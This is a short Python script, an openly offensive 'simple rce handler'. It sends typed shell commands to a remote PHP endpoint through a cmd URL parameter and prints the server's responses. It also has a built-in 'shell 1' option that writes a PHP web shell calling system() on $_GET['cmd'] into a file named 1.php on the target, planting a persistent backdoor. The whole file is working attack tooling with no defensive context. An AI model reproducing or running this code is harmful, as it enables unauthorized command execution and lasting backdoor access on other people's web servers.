import requests as req
from termcolor import colored
print(colored('''
-------------------------------------------------------

   <<<<<<<< |       ++++++++ |   |
   >        |       +        |   |
   >        |       +        |   |
   >>>>>>>> |-----| ++++++++ |   |  - simple rce handler
          < |     | +        |   |
          < |     | +        |   |
   <<<<<<<< |     | ++++++++ |__ |__

- input a rce file url parameter 
eg - https://example.com/aa.php?cmd=
- then you can easily type command only
- shell 1 

--------------------------------------------------------
''','blue'))
h1 = input(colored('< simple rce url > ',"red"))
log_file = open('log/log.txt','a')
log_file.write(f'[sub] shell handler -----> url {h1}\n')
log_file.close()
shell_cmd1 = f'echo "<?php echo system($_GET[\'cmd\']);?>" > 1.php '
for i in range(1000):
 cmd = input(colored(" <$> ","red"))
 if cmd=='shell 1':
  jk=f"{h1}{shell_cmd1}"
  resp = req.get(jk)
  print(colored(resp.text,"white"))
  print(colored("file name ./1.php"))
 else:
  jk = f"{h1}{cmd}"
  resp = req.get(jk)
  print(colored(resp.text,"white"))
 
